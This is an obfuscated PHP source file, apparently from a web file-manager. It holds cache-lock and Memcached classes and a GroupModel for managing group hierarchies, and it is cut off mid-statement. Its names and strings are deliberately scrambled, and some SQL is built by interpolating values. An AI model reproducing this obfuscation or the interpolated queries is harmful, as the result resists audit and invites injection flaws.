<?php
 goto f¬¡…©Õ£Û; Då÷¬ÔÂĞ”: class CacheLockMemcached { public function lock($ÎÙÉ†¥, $à¦¥ûœ = 0) { $ë‹´Õ… = Cache::init(); $èßû¬æİ = microtime(!0) + $à¦¥ûœ; while (microtime(!0) < $èßû¬æİ) { $ÇÛŞïõË = $ë‹´Õ…->get($ÎÙÉ†¥); if (!$ÇÛŞïõË || $ÇÛŞïõË < microtime(!0)) { $æê²øäã = $ë‹´Õ…->handle->add($ÎÙÉ†¥, $èßû¬æİ, $à¦¥ûœ); if ($æê²øäã) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ı•Û¦) { return Cache::init()->get($ı•Û¦); } public function unlock($ºÛù†÷‹) { return Cache::init()->remove($ºÛù†÷‹); } } class CacheLockDatabase { public function lock($µå”, $äê­´•ñ = 0) { $«¿Ú«à  = Model($_SERVER[§ŒØóıü][835]); $­í¯ÚŞõ = microtime(!0) + $äê­´•ñ; while (microtime(!0) < $­í¯ÚŞõ) { $İ©Ú„èœ = $«¿Ú«à ->get($µå”); if (!$İ©Ú„èœ || $İ©Ú„èœ < microtime(!0)) { $ÛÎØƒ÷ç = $«¿Ú«à ->set($µå”, $­í¯ÚŞõ); if ($ÛÎØƒ÷ç) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($‡É®†šÚ) { return Model($_SERVER[§ŒØóıü][835])->get($‡É®†šÚ); } public function unlock($Œ’Ã÷Ô) { Model($_SERVER[§ŒØóıü][835])->remove($Œ’Ã÷Ô); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ôà•—ª, $íù§›í“) { $‹ÅåÃ‹ë =& $_SERVER[§ŒØóıü]; if (!class_exists($‹ÅåÃ‹ë[872])) { show_json($‹ÅåÃ‹ë[873], !1); } $this->cacheTime = $íù§›í“; $this->handle = new Memcached(); if (is_array($Ôà•—ª[$‹ÅåÃ‹ë[874]]) && count($Ôà•—ª[$‹ÅåÃ‹ë[874]]) >= 1) { foreach ($Ôà•—ª[$‹ÅåÃ‹ë[874]] as $éúí­Ğú) { $èõóİÔ = explode($‹ÅåÃ‹ë[4], $éúí­Ğú); $this->handle->addServer($èõóİÔ[0], $èõóİÔ[1]); } } else { $this->handle->addServer($Ôà•—ª[$‹ÅåÃ‹ë[182]], $Ôà•—ª[$‹ÅåÃ‹ë[183]]); } } public function set($ıß„Ó¿÷, $ßİ’ª, $Ë…şß = false) { $Ë…şß = $Ë…şß ? $Ë…şß : $this->cacheTime; return $this->handle->set($ıß„Ó¿÷, $ßİ’ª, $Ë…şß); } public function get($¬ ¿ßµü) { return $this->handle->get($¬ ¿ßµü); } public function remove($Û­ëú‡ñ) { return $this->handle->delete($Û­ëú‡ñ); } public function deleteAll() { return $this->handle->flush(); } } goto dÓ§×é¸¹; cöÊë¶¨©¯: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\145" => "\x67\x72\x6f\x75\160\137\x6d\145\164\141", "\155\x65\164\141\106\x69\145\154\144" => "\x67\x72\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($î¿ƒ–œ¸) { $³Ÿï”éÍ =& $_SERVER[§ŒØóıü]; return array($³Ÿï”éÍ[1940] => array($î¿ƒ–œ¸[0], $³Ÿï”éÍ[1941]), $³Ÿï”éÍ[1942] => array($î¿ƒ–œ¸[0], $³Ÿï”éÍ[1943])); } protected function getInfo($À½©‡õş, $­Ê ˜õ = false) { $ğœóıË² = $this->getInfoSimple($À½©‡õş); if (!$ğœóıË²) { return !1; } if ($­Ê ˜õ) { return $this->_listDataApplyItem($ğœóıË²); } return $this->cacheFunctionGet($_SERVER[§ŒØóıü][1944], $À½©‡õş); } protected function getInfoSimple($­´ÎØ÷, $ÕûÁÌ’— = false) { $Ÿíƒ£€³ =& $_SERVER[§ŒØóıü]; if ($ÕûÁÌ’—) { $ñÚ áÔ = array($Ÿíƒ£€³[1862] => intval($­´ÎØ÷)); $Øü¬ùÛ = $this->where($ñÚ áÔ)->find(); return is_array($Øü¬ùÛ) ? $Øü¬ùÛ : array(); } return $this->cacheFunctionGet($Ÿíƒ£€³[1945], $­´ÎØ÷); } protected function groupAdd($å¾£š­î) { $º‡‡‘‡Ç =& $_SERVER[§ŒØóıü]; if (!$å¾£š­î[$º‡‡‘‡Ç[432]] && isset($å¾£š­î[$º‡‡‘‡Ç[1862]]) && $å¾£š­î[$º‡‡‘‡Ç[1862]] == 1) { if ($®º›³ˆ´ = $this->getInfoSimple($å¾£š­î[$º‡‡‘‡Ç[1862]], !0)) { return $å¾£š­î[$º‡‡‘‡Ç[1862]]; } } else { $®º›³ˆ´ = $this->getInfoSimple($å¾£š­î[$º‡‡‘‡Ç[432]]); if (!$®º›³ˆ´) { return !1; } } $úôñ«Õ¿ = $º‡‡‘‡Ç[521]; if ($®º›³ˆ´[$º‡‡‘‡Ç[511]]) { $úôñ«Õ¿ = $®º›³ˆ´[$º‡‡‘‡Ç[511]] . $®º›³ˆ´[$º‡‡‘‡Ç[1862]] . $º‡‡‘‡Ç[50]; } $‰€ÌæĞ— = array($º‡‡‘‡Ç[420] => $this->groupNameAuto($å¾£š­î[$º‡‡‘‡Ç[432]], $å¾£š­î[$º‡‡‘‡Ç[32]]), $º‡‡‘‡Ç[401] => $å¾£š­î[$º‡‡‘‡Ç[432]], $º‡‡‘‡Ç[580] => $úôñ«Õ¿, $º‡‡‘‡Ç[1946] => $å¾£š­î[$º‡‡‘‡Ç[1849]], $º‡‡‘‡Ç[1947] => 0, $º‡‡‘‡Ç[1866] => 0); if (isset($å¾£š­î[$º‡‡‘‡Ç[1886]])) { $‰€ÌæĞ—[$º‡‡‘‡Ç[1886]] = $å¾£š­î[$º‡‡‘‡Ç[1886]]; } else { $÷¡·ô»Ş = $this->max($º‡‡‘‡Ç[1886]); if (!$÷¡·ô»Ş) { $÷¡·ô»Ş = 0; } $‰€ÌæĞ—[$º‡‡‘‡Ç[1886]] = $÷¡·ô»Ş + 1; } if (!empty($å¾£š­î[$º‡‡‘‡Ç[1862]])) { $‰€ÌæĞ—[$º‡‡‘‡Ç[1862]] = $å¾£š­î[$º‡‡‘‡Ç[1862]]; } $øÀ‹ãˆã = $this->add($‰€ÌæĞ—); $this->setNamePinyin($øÀ‹ãˆã, $‰€ÌæĞ—[$º‡‡‘‡Ç[32]]); if (isset($å¾£š­î[$º‡‡‘‡Ç[1948]])) { $this->metaSet($øÀ‹ãˆã, array($º‡‡‘‡Ç[1948] => $å¾£š­î[$º‡‡‘‡Ç[1948]], $º‡‡‘‡Ç[1949] => $å¾£š­î[$º‡‡‘‡Ç[1949]])); unset($å¾£š­î[$º‡‡‘‡Ç[1948]]); unset($å¾£š­î[$º‡‡‘‡Ç[1949]]); } Model($º‡‡‘‡Ç[1345])->groupRootAdd($øÀ‹ãˆã); $this->_clearCache($å¾£š­î[$º‡‡‘‡Ç[432]]); return $øÀ‹ãˆã; } protected function groupEdit($âí™öµº, $ïÈ»Ìê) { $™¢ÁÃìå =& $_SERVER[§ŒØóıü]; $Ù¢øåšÊ = $this->getInfoSimple($âí™öµº); if (!$Ù¢øåšÊ) { return !1; } if (!empty($ïÈ»Ìê[$™¢ÁÃìå[432]])) { $ú³ßçŞˆ = $this->getInfoSimple($ïÈ»Ìê[$™¢ÁÃìå[432]]); if (!$ú³ßçŞˆ) { return !1; } if ($Ù¢øåšÊ[$™¢ÁÃìå[1862]] == $ú³ßçŞˆ[$™¢ÁÃìå[1862]]) { return !1; } if ($ïÈ»Ìê[$™¢ÁÃìå[432]] != $Ù¢øåšÊ[$™¢ÁÃìå[432]]) { if ($ú³ßçŞˆ[$™¢ÁÃìå[511]] !== $Ù¢øåšÊ[$™¢ÁÃìå[511]] && strpos($ú³ßçŞˆ[$™¢ÁÃìå[511]], $Ù¢øåšÊ[$™¢ÁÃìå[511]] . $Ù¢øåšÊ[$™¢ÁÃìå[1862]] . $™¢ÁÃìå[50]) === 0) { return !1; } $ïÈ»Ìê[$™¢ÁÃìå[580]] = $ú³ßçŞˆ[$™¢ÁÃìå[511]] . $ïÈ»Ìê[$™¢ÁÃìå[432]] . $™¢ÁÃìå[50]; $this->_changeChildLevel($Ù¢øåšÊ, $ú³ßçŞˆ); $this->_clearCache($ú³ßçŞˆ[$™¢ÁÃìå[1862]]); $this->_clearCache($Ù¢øåšÊ[$™¢ÁÃìå[432]]); } } if (isset($ïÈ»Ìê[$™¢ÁÃìå[32]])) { $this->setNamePinyin($âí™öµº, $ïÈ»Ìê[$™¢ÁÃìå[32]]); } if (isset($ïÈ»Ìê[$™¢ÁÃìå[1948]])) { $this->metaSet($âí™öµº, array($™¢ÁÃìå[1948] => $ïÈ»Ìê[$™¢ÁÃìå[1948]], $™¢ÁÃìå[1949] => $ïÈ»Ìê[$™¢ÁÃìå[1949]])); unset($ïÈ»Ìê[$™¢ÁÃìå[1948]]); unset($ïÈ»Ìê[$™¢ÁÃìå[1949]]); } $this->_clearChildrenCache($Ù¢øåšÊ); return $this->where(array($™¢ÁÃìå[1950] => $âí™öµº))->save($ïÈ»Ìê); } private function _clearChildrenCache($ì“Ÿ§Øœ) { $ËĞì·¦ =& $_SERVER[§ŒØóıü]; $‚¤Ö™†€ = array($ËĞì·¦[580] => array($ËĞì·¦[540], $ì“Ÿ§Øœ[$ËĞì·¦[511]] . $ì“Ÿ§Øœ[$ËĞì·¦[1862]] . $ËĞì·¦[541])); $©Ö¯ÆÛ¨ = $this->field($ËĞì·¦[1862])->where($‚¤Ö™†€)->select(); foreach ($©Ö¯ÆÛ¨ as $²úé™Ÿ ) { $this->_clearCache($²úé™Ÿ [$ËĞì·¦[1862]]); } } private function _clearCache($ßß²†µ–) { $£­¿º‹û =& $_SERVER[§ŒØóıü]; $this->cacheFunctionClear($£­¿º‹û[1944], $ßß²†µ–); $this->cacheFunctionClear($£­¿º‹û[1945], $ßß²†µ–); } private function _changeChildLevel($ÂİÁ„ŠÓ, $ÃğÆ©‚, $“ÏÉÅô = false) { $øÑæï©ã =& $_SERVER[§ŒØóıü]; $¶öÕ¼£Œ = $ÂİÁ„ŠÓ[$øÑæï©ã[511]] . $ÂİÁ„ŠÓ[$øÑæï©ã[1862]] . $øÑæï©ã[50]; $Šú¥¤Ø = $ÃğÆ©‚[$øÑæï©ã[511]] . $ÃğÆ©‚[$øÑæï©ã[1862]] . $øÑæï©ã[50] . $ÂİÁ„ŠÓ[$øÑæï©ã[1862]] . $øÑæï©ã[50]; if ($“ÏÉÅô) { $Šú¥¤Ø = $ÃğÆ©‚[$øÑæï©ã[511]] . $ÃğÆ©‚[$øÑæï©ã[1862]] . $øÑæï©ã[50]; } $÷ó§¡Ÿ‰ = array($øÑæï©ã[580] => array($øÑæï©ã[540], $ÂİÁ„ŠÓ[$øÑæï©ã[511]] . $ÂİÁ„ŠÓ[$øÑæï©ã[1862]] . $øÑæï©ã[541])); $‹Ç«¯¾ = array($øÑæï©ã[580] => array($øÑæï©ã[589], "\x72\145\160\154\141\143\145\x28\x70\x61\162\145\x6e\164\x4c\x65\166\145\x6c\x2c\47{$¶öÕ¼£Œ}\x27\x2c\x27{$Šú¥¤Ø}\47\51")); $this->_clearChildrenCache($ÂİÁ„ŠÓ); $this->where($÷ó§¡Ÿ‰)->data($‹Ç«¯¾)->save(); } public function setNamePinyin($§”„ÖÄË, $Ëàªòí = false) { $Ñºª©Ñû =& $_SERVER[§ŒØóıü]; if (!$Ëàªòí) { $Áõ³ªÂô = $this->getInfoSimple($§”„ÖÄË); $Ëàªòí = $Áõ³ªÂô[$Ñºª©Ñû[32]]; } if (!Input::check($Ëàªòí, $Ñºª©Ñû[583])) { $this->metaSet($§”„ÖÄË, $Ñºª©Ñû[465], null); $this->metaSet($§”„ÖÄË, $Ñºª©Ñû[464], null); return; } $»Ú—¬¦¼ = array($Ñºª©Ñû[465] => str_replace($Ñºª©Ñû[53], $Ñºª©Ñû[12], Pinyin::get($Ëàªòí)), $Ñºª©Ñû[464] => Pinyin::get($Ëàªòí, $Ñºª©Ñû[584])); $this->metaSet($§”„ÖÄË, $»Ú—¬¦¼); } protected function groupStatus($ƒÛşš•, $ğ‚§Éï) { $ŠæŒƒÑª =& $_SERVER[§ŒØóıü]; $Ò¹ëîİô = $this->getInfoSimple($ƒÛşš•); if (!$Ò¹ëîİô) { return !1; } if ($ğ‚§Éï == $ŠæŒƒÑª[88]) { $‚¬’ÎÚŞ = $this->parentLevelArray($Ò¹ëîİô[$ŠæŒƒÑª[511]]); } else { $ÛëëÈèÁ = array($ŠæŒƒÑª[580] => array($ŠæŒƒÑª[540], $Ò¹ëîİô[$ŠæŒƒÑª[511]] . $Ò¹ëîİô[$ŠæŒƒÑª[1862]] . $ŠæŒƒÑª[541])); $‚¬’ÎÚŞ = $this->where($ÛëëÈèÁ)->field($ŠæŒƒÑª[1862])->select(); $‚¬’ÎÚŞ = array_to_keyvalue($‚¬’ÎÚŞ, $ŠæŒƒÑª[12], $ŠæŒƒÑª[1862]); } $‚¬’ÎÚŞ[] = $Ò¹ëîİô[$ŠæŒƒÑª[1862]]; $Ğ¼Â™Ëı = array(); foreach ($‚¬’ÎÚŞ as $ƒÛşš•) { $Ğ¼Â™Ëı[] = array($ŠæŒƒÑª[1862] => $ƒÛşš•, $ŠæŒƒÑª[94] => $ŠæŒƒÑª[755], $ŠæŒƒÑª[374] => $ğ‚§Éï); $this->_clearCache($ƒÛşš•); } return Model($ŠæŒƒÑª[1951])->addAll($Ğ¼Â™Ëı, array(), !0); } protected function groupRemove($ãÌÂÖ±µ, $•ö˜Ñã = false) { $ĞÙï›Í˜ =& $_SERVER[§ŒØóıü]; $ÜÇœØÄ = array($ĞÙï›Í˜[1862] => $ãÌÂÖ±µ); $ß©‡ÑÏ’ = $this->where($ÜÇœØÄ)->find(); if (!$ß©‡ÑÏ’ || $ß©‡ÑÏ’[$ĞÙï›Í˜[432]] == 0) { return !1; } if (!$•ö˜Ñã) { $öà¬øŸ™ = $this->getInfoSimple($ß©‡ÑÏ’[$ĞÙï›Í˜[432]]); $this->_changeChildLevel($ß©‡ÑÏ’, $öà¬øŸ™, !0); $this->where(array($ĞÙï›Í˜[432] => $ãÌÂÖ±µ))->save(array($ĞÙï›Í˜[432] => $ß©‡ÑÏ’[$ĞÙï›Í˜[432]])); $this->_clearCache($öà¬øŸ™[$ĞÙï›Í˜[1862]]); } Model($ĞÙï›Í˜[1951])->where($ÜÇœØÄ)->delete(); Model($ĞÙï›Í˜[1952])->where($ÜÇœØÄ)->delete(); Model($ĞÙï›Í˜[831])->groupRootRemove($ãÌÂÖ±µ); $this->_clearCache($ß©‡ÑÏ’[$ĞÙï›Í˜[432]]); return $this->where($ÜÇœØÄ)->delete(); } protected function groupSort($¤óâ¯İû) { $Ãõ•’‚‡ =& $_SERVER[§ŒØóıü]; $¶ã¿äÂÕ = array(); foreach ($¤óâ¯İû as $ûêÈÀÓ„ => $ÑÜƒÇèá) { $¶ã¿äÂÕ[] = array($Ãõ•’‚‡[1862], $ÑÜƒÇèá, $Ãõ•’‚‡[1886], $ûêÈÀÓ„ + 1); } $this->saveAll($¶ã¿äÂÕ); } public function listData() { $¢ä¾Î‘ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¢ä¾Î‘[$_SERVER[§ŒØóıü][369]]); return $¢ä¾Î‘; } private function _makeOrder($Éµïµş = '') { $ıßïİŞŞ =& $_SERVER[§ŒØóıü]; $ÑªíŸ¡ = array($ıßïİŞŞ[1862], $ıßïİŞŞ[32], $ıßïİŞŞ[1851], $ıßïİŞŞ[201]); $œ¦ì”âŒ = array($ıßïİŞŞ[450] => $ıßïİŞŞ[451], $ıßïİŞŞ[452] => $ıßïİŞŞ[453]); $Œàİ×± = Input::get($ıßïİŞŞ[457], $ıßïİŞŞ[7], $ıßïİŞŞ[1866], $ÑªíŸ¡); $Ñ½Êá¿‚ = Input::get($ıßïİŞŞ[458], $ıßïİŞŞ[7], $ıßïİŞŞ[1953], array($ıßïİŞŞ[1953], $ıßïİŞŞ[452])); $Ñ½Êá¿‚ = $œ¦ì”âŒ[$Ñ½Êá¿‚]; $Éµïµş = $Éµïµş . "{$Œàİ×±}\x20{$Ñ½Êá¿‚}\54\x20\147\x72\157\165\160\x49\x44\40\141\163\143"; return $this->order($Éµïµş); } public function listChild($Äîè†õ¯) { $›Ûİ„Š˜ =& $_SERVER[§ŒØóıü]; $ôºªà¶ê = $this->where(array($›Ûİ„Š˜[432] => $Äîè†õ¯))->_makeOrder()->selectPage(200); $this->_listDataApply($ôºªà¶ê[$›Ûİ„Š˜[369]]); return $ôºªà¶ê; } public function listChildIds($·’¡¯Ç­) { $³èİãÙ° =& $_SERVER[§ŒØóıü]; if (is_string($ç‘ôÕÕ)) { $·’¡¯Ç­ = explode($³èİãÙ°[50], $·’¡¯Ç­); } $óÈæ››Ò = $this->where(array($³èİãÙ°[1862] => array($³èİãÙ°[7], $·’¡¯Ç­)))->field($³èİãÙ°[1954])->select(); if (!$óÈæ››Ò) { return !1; } $ˆİ¦©ûœ = array(); foreach ($óÈæ››Ò as $¸È‡÷ˆî) { $ˆİ¦©ûœ[] = "\163\145\x6c\145\143\x74\40\x67\x72\157\165\x70\x49\104\x20\146\x72\157\x6d\x20\140\147\x72\x6f\165\160\140\40\167\x68\x65\162\x65\x20\x70\141\162\x65\x6e\164\114\x65\x76\145\154\x20\x6c\151\153\x65\40\47{$¸È‡÷ˆî[$³èİãÙ°[511]]}{$¸È‡÷ˆî[$³èİãÙ°[1862]]}\x2c\45\x27"; } $ˆİ¦©ûœ = implode($³èİãÙ°[1955], $ˆİ¦©ûœ); $óÈæ››Ò = $this->query($ˆİ¦©ûœ); if (!$óÈæ››Ò) { return array(); } $·’¡¯Ç­ = array_to_keyvalue($óÈæ››Ò, $³èİãÙ°[12], $³èİãÙ°[1862]); return array_unique($·’¡¯Ç­); } public function listByID($Œ¢ÛùßÂ) { $áÜø×üş =& $_SERVER[§ŒØóıü]; if (!$Œ¢ÛùßÂ) { return array(); } $Áü¬›ÚÊ = array($áÜø×üş[1862] => array($áÜø×üş[7], $Œ¢ÛùßÂ)); $¡‰ºøê€ = $this->where($Áü¬›ÚÊ)->select(); $¡‰ºøê€ = array_sort_keep($¡‰ºøê€, $áÜø×üş[1862], $Œ¢ÛùßÂ); $this->_listDataApply($¡‰ºøê€); return $¡‰ºøê€; } public function listSearch($şäÔ¬¤) { $×·ßÁ’è =& $_SERVER[§ŒØóıü]; $ÈîóÒıú = $şäÔ¬¤[$×·ßÁ’è[1956]]; $¸»±Ÿ­¡ = isset($şäÔ¬¤[$×·ßÁ’è[1957]]) ? $şäÔ¬¤[$×·ßÁ’è[1957]] : !1; if (!trim($ÈîóÒıú)) { return !1; } $ÈîóÒıú = str_replace($×·ßÁ’è[1958], $×·ßÁ’è[1959], $ÈîóÒıú); $¬µõ¼âÄ = array($×·ßÁ’è[1862] => array($×·ßÁ’è[383], "{$ÈîóÒıú}\45"), $×·ßÁ’è[32] => array($×·ßÁ’è[383], "\45{$ÈîóÒıú}\45"), $×·ßÁ’è[1006] => $×·ßÁ’è[1960]); if ($¸»±Ÿ­¡) { $ù’©òúã = $this->getInfoSimple($¸»±Ÿ­¡); $Ó˜ÂšûÒ = $ù’©òúã[$×·ßÁ’è[511]] . $¸»±Ÿ­¡ . $×·ßÁ’è[541]; $¬µõ¼âÄ = array($¬µõ¼âÄ, array($×·ßÁ’è[511] => array($×·ßÁ’è[383], $Ó˜ÂšûÒ))); } $¬µõ¼âÄ = $this->parseWhereLike($¬µõ¼âÄ); $ÎŠ‰›¨ = $this->_makeOrder()->where($¬µõ¼âÄ)->selectPage(20); $ÎŠ‰›¨ = $ÎŠ‰›¨ ? $ÎŠ‰›¨ : array($×·ßÁ’è[369] => array(), $×·ßÁ’è[366] => array()); if (!$ÎŠ‰›¨ || count($ÎŠ‰›¨[$×·ßÁ’è[369]]) < 5 && Input::check($ÈîóÒıú, $×·ßÁ’è[318])) { $îÙí˜Ñ½ = $this->groupChildrenAll($¸»±Ÿ­¡); $íÜĞ¡ = $this->_searchFromMeta($×·ßÁ’è[464], $ÈîóÒıú, 10, $îÙí˜Ñ½); $”ÀùÓƒ = $this->_searchFromMeta($×·ßÁ’è[465], $ÈîóÒıú, 10, $îÙí˜Ñ½); $”—äÕ¢“ = array_merge($íÜĞ¡, $”ÀùÓƒ, $ÎŠ‰›¨[$×·ßÁ’è[369]]); $ÎŠ‰›¨[$×·ßÁ’è[369]] = array_unique_by_key($”—äÕ¢“, $×·ßÁ’è[1862]); $ÎŠ‰›¨[$×·ßÁ’è[366]][$×·ßÁ’è[367]] = count($ÎŠ‰›¨[$×·ßÁ’è[369]]); $ÎŠ‰›¨[$×·ßÁ’è[366]][$×·ßÁ’è[368]] = ceil($ÎŠ‰›¨[$×·ßÁ’è[366]][$×·ßÁ’è[367]] / $ÎŠ‰›¨[$×·ßÁ’è[366]][$×·ßÁ’è[363]]); } $this->_listDataApply($ÎŠ‰›¨[$×·ßÁ’è[369]]); return $ÎŠ‰›¨; } protected function groupChildrenAll($Ïøı”ş·) { $×À¹šúÒ =& $_SERVER[§ŒØóıü]; if (!$Ïøı”ş·) { return !1; } if (is_string($Ïøı”ş·)) { $Ïøı”ş· = array($Ïøı”ş·); } $‡¥±ÁÖÁ = $Ïøı”ş·; foreach ($Ïøı”ş· as $è‡¼şß¹) { $ş¿Æç§¢ = $this->getInfoSimple($è‡¼şß¹); $äıÃŒ¬‡ = array($×À¹šúÒ[511] => array($×À¹šúÒ[383], $ş¿Æç§¢[$×À¹šúÒ[511]] . $è‡¼şß¹ . $×À¹šúÒ[541])); $„Á€Ğì = $this->field($×À¹šúÒ[1862])->where($äıÃŒ¬‡)->select(); $‡¥±ÁÖÁ = array_merge($‡¥±ÁÖÁ, array_to_keyvalue($„Á€Ğì, $×À¹šúÒ[12], $×À¹šúÒ[1862])); } return array_unique($‡¥±ÁÖÁ); } private function _searchFromMeta($ì†ÛÌé, $„í½øş™, $Ç¼ã¸áô, $³›õãùñ) { $å˜ë• ó =& $_SERVER[§ŒØóıü]; $„í½øş™ = strtolower($„í½øş™); $ûè÷ğ¦õ = array($å˜ë• ó[94] => $ì†ÛÌé, $å˜ë• ó[374] => array($å˜ë• ó[383], "\45{$„í½øş™}\x25")); $ûè÷ğ¦õ = $this->parseWhereLike($ûè÷ğ¦õ); if ($³›õãùñ) { $ûè÷ğ¦õ[$å˜ë• ó[1862]] = array($å˜ë• ó[7], $³›õãùñ); } $¹¯™‚Øğ = Model($å˜ë• ó[1961])->where($ûè÷ğ¦õ)->limit($Ç¼ã¸áô)->select(); if (!$¹¯™‚Øğ) { return array(); } $¹¯™‚Øğ = array_to_keyvalue($¹¯™‚Øğ, $å˜ë• ó[12], $å˜ë• ó[1862]); $ñÀë¾Ì = $this->where(array($å˜ë• ó[1950] => array($å˜ë• ó[7], $¹¯™‚Øğ)))->select(); if (!$ñÀë¾Ì) { return array(); } return $ñÀë¾Ì; } protected function _listDataApplyItem($—©„é¶˜) { $ÙÙ“³©“ = array($—©„é¶˜); $this->_listDataApply($ÙÙ“³©“); return $ÙÙ“³©“[0]; } protected function _listDataApply(&$—òâšè) { $†Û‚Ë =& $_SERVER[§ŒØóıü]; if (!$—òâšè) { return; } $æ½î¿¬ã = array_to_keyvalue($—òâšè, $†Û‚Ë[12], $†Û‚Ë[1862]); $this->_listAppendChildren($—òâšè); $this->_listAppendChildrenMember($—òâšè); $this->_listAppendMeta($—òâšè, $æ½î¿¬ã); $this->_listAppendParent($—òâšè); $this->_listAppendSourceRoot($—òâšè, $æ½î¿¬ã); } private function _listAppendChildren(&$§¸ìú¹Š) { $€‡ÄØÁ– =& $_SERVER[§ŒØóıü]; $éÂËÜ¢Í = array_to_keyvalue($§¸ìú¹Š, $€‡ÄØÁ–[12], $€‡ÄØÁ–[1862]); $‹µ­€†Ş = array($€‡ÄØÁ–[432] => array($€‡ÄØÁ–[7], $éÂËÜ¢Í)); $Ïí€æˆÆ = array($€‡ÄØÁ–[432], $€‡ÄØÁ–[1962] => $€‡ÄØÁ–[491]); $ØúªÂ€ = $this->field($Ïí€æˆÆ)->where($‹µ­€†Ş)->group($€‡ÄØÁ–[432])->select(); $ô­ÁÏïù = array_to_keyvalue($ØúªÂ€, $€‡ÄØÁ–[432], $€‡ÄØÁ–[491]); foreach ($§¸ìú¹Š as &$÷İçãæ) { $ËÌŠÌÆª = $÷İçãæ[$€‡ÄØÁ–[1862]]; $÷İçãæ[$€‡ÄØÁ–[1963]] = isset($ô­ÁÏïù[$ËÌŠÌÆª]) ? intval($ô­ÁÏïù[$ËÌŠÌÆª]) : !1; } unset($÷İçãæ); } private function _listAppendChildrenMember(&$åÕ¤é–) { $‰Ğªâ·¢ =& $_SERVER[§ŒØóıü]; $÷¦ßÅô = array_to_keyvalue($åÕ¤é–, $‰Ğªâ·¢[12], $‰Ğªâ·¢[1862]); $¤Ã¤øíÉ = array($‰Ğªâ·¢[1862] => array($‰Ğªâ·¢[7], $÷¦ßÅô)); $ª’µ‘¥§ = array($‰Ğªâ·¢[1862], $‰Ğªâ·¢[1962] => $‰Ğªâ·¢[491]); $É“®° = Model($‰Ğªâ·¢[1952])->field($ª’µ‘¥§)->where($¤Ã¤øíÉ)->group($‰Ğªâ·¢[1862])->select(); $Ÿê•¸­´ = array_to_keyvalue($É“®°, $‰Ğªâ·¢[1862], $‰Ğªâ·¢[491]); foreach ($åÕ¤é– as &$•ó™â–±) { $İ¢›ÂÙø = $•ó™â–±[$‰Ğªâ·¢[1862]]; $•ó™â–±[$‰Ğªâ·¢[1964]] = isset($Ÿê•¸­´[$İ¢›ÂÙø]) ? intval($Ÿê•¸­´[$İ¢›ÂÙø]) : !1; } unset($•ó™â–±); } private function _listAppendMeta(&$‡æÇÌ¬©, $”õ£í½é) { $ÍÓ¦½Èø =& $_SERVER[§ŒØóıü]; $¾‘Õß¤† = array($ÍÓ¦½Èø[1862] => array($ÍÓ¦½Èø[7], $”õ£í½é)); $Àóİê à = Model($ÍÓ¦½Èø[1951])->where($¾‘Õß¤†)->select(); $Àóİê à = array_to_keyvalue_group($Àóİê à, $ÍÓ¦½Èø[1862]); foreach ($Àóİê à as &$¥Ú½˜­Õ) { $¥Ú½˜­Õ = array_to_keyvalue($¥Ú½˜­Õ, $ÍÓ¦½Èø[94], $ÍÓ¦½Èø[374]); } unset($¥Ú½˜­Õ); foreach ($‡æÇÌ¬© as &$§„×Ø³º) { $§„×Ø³º[$ÍÓ¦½Èø[466]] = array(); if (isset($Àóİê à[$§„×Ø³º[$ÍÓ¦½Èø[1862]]])) { $§„×Ø³º[$ÍÓ¦½Èø[466]] = $Àóİê à[$§„×Ø³º[$ÍÓ¦½Èø[1862]]]; } } unset($§„×Ø³º); } protected function parentLevelArray($ÁÈÉ¨Ÿ´) { $À’ˆäœ =& $_SERVER[§ŒØóıü]; $ÁÈÉ¨Ÿ´ = explode($À’ˆäœ[50], trim($ÁÈÉ¨Ÿ´, $À’ˆäœ[50])); $ÁÈÉ¨Ÿ´ = array_remove_value($ÁÈÉ¨Ÿ´, $À’ˆäœ[198]); return $ÁÈÉ¨Ÿ´; } protected function parentInGroup($‘†«â‹‘, $»®¦´±Ç) { $³ƒñ€ª… =& $_SERVER[§ŒØóıü]; $—•ÃìıÜ = $this->getInfoSimple($‘†«â‹‘); if (!$—•ÃìıÜ) { return !0; } $Ëûô¹¨½ = $this->parentLevelArray($—•ÃìıÜ[$³ƒñ€ª…[511]]); $Ëûô¹¨½[] = $‘†«â‹‘; foreach ($Ëûô¹¨½ as $‘†«â‹‘) { if (in_array($‘†«â‹‘ . $³ƒñ€ª…[12], $»®¦´±Ç)) { return !0; } } return !1; } private function _listAppendParent(&$åŒ·ø‘Ü) { $Ü¯Ş…ûø =& $_SERVER[§ŒØóıü]; $ºäíù€ = array(); foreach ($åŒ·ø‘Ü as &$··ŸƒŞÕ) { $ºäíù€[$··ŸƒŞÕ[$Ü¯Ş…ûø[1862]]] = $··ŸƒŞÕ[$Ü¯Ş…ûø[32]]; $Ï™öÈî = $this->parentLevelArray($··ŸƒŞÕ[$Ü¯Ş…ûø[511]]); foreach ($Ï™öÈî as $Î ÇÖ€ú) { if (!isset($ºäíù€[$Î ÇÖ€ú])) { $ºäíù€[$Î ÇÖ€ú] = 0; } } } unset($··ŸƒŞÕ); foreach ($ºäíù€ as $ö•Ù¾‚ä => $³˜–êÀ) { if ($³˜–êÀ) { continue; } $Ì–÷Î’ª = $this->getInfoSimple($ö•Ù¾‚ä); $ºäíù€[$ö•Ù¾‚ä] = $Ì–÷Î’ª[$Ü¯Ş…ûø[32]]; } $ó…üæàÈ = $GLOBALS[$Ü¯Ş…ûø[6]][$Ü¯Ş…ûø[89]][$Ü¯Ş…ûø[1965]]; if ($GLOBALS[$Ü¯Ş…ûø[494]] == $Ü¯Ş…ûø[88]) { $ó…üæàÈ = !1; } foreach ($åŒ·ø‘Ü as &$··ŸƒŞÕ) { $Ï™öÈî = $this->parentLevelArray($··ŸƒŞÕ[$Ü¯Ş…ûø[511]]); $òÙ î‰ü = $Ü¯Ş…ûø[12]; foreach ($Ï™öÈî as $ö•Ù¾‚ä => $Î ÇÖ€ú) { if ($ó…üæàÈ && $ö•Ù¾‚ä == 0) { continue; } $òÙ î‰ü .= $ºäíù€[$Î ÇÖ€ú] . $Ü¯Ş…ûø[8]; } if ($Ï™öÈî) { $òÙ î‰ü .= $··ŸƒŞÕ[$Ü¯Ş…ûø[32]]; } $··ŸƒŞÕ[$Ü¯Ş…ûø[516]] = str_replace($Ü¯Ş…ûø[519], $Ü¯Ş…ûø[8], $òÙ 